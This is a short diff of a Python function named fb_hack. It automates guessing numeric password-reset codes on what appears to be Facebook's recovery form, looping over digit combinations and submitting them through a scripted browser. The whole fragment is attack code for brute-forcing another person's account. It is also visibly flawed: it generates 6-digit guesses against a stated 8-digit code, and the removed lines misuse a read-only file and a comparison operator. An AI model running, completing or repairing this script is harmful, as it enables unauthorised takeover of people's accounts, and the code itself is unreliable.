@@ -121,13 +121,8 @@ def fb_hack(email, codex):
   elif check2 != test:
     print(check2)
     attempt = int(codex)
-    f = open("8digits.txt", "r")
     for combination in itertools.product(range(10), repeat=6):
-        f.write(''.join(map(str, combination)))
-    while check2 =="Please check your email for a message with your code. Your code is 8 numbers long.":
-      browser.select_form(nr=0)
-      print(f.readlines(attempt))
-      y == str(f.readlines(attempt))
+      x = (''.join(map(str, combination)))
       attempt += 1
       try:
         browser.select_form(nr=0)
